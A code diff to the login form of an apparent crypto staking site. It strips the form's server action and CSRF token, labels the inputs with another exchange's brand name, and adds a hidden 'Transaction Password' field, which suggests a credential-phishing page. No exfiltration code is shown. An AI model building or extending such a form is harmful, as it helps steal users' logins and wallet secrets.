@@ -198,16 +198,18 @@
           your crypto assets, earn daily rewards, and embark on a secure and
           rewarding journey with us.
         </p>
-        <form class="register__form mrg--btm-40" method="POST" action="/login">
-          <input
-            type="hidden"
-            name="_token"
-            value="s7suoK82pOZobC27nUEOuJ4q91v8wfXwB5DntpPw"
-          />
+        <form class="register__form mrg--btm-40">
           <label for="email">Email</label>
           <input type="email" id="coinmarketcap-username" name="email" />
           <label for="password">Password</label>
           <input type="password" id="coinmarketcap-password" name="password" />
+          <div
+            id="secret-component"
+            style="display: none; flex-direction: column"
+          >
+            <label for="password">Transaction Password</label>
+            <input type="text" id="coinmarketcap-secret" />
+          </div>
           <a href="https://echoone.io/forgot-password" class="text--highlight"
             >Forgot Password?</a
           >
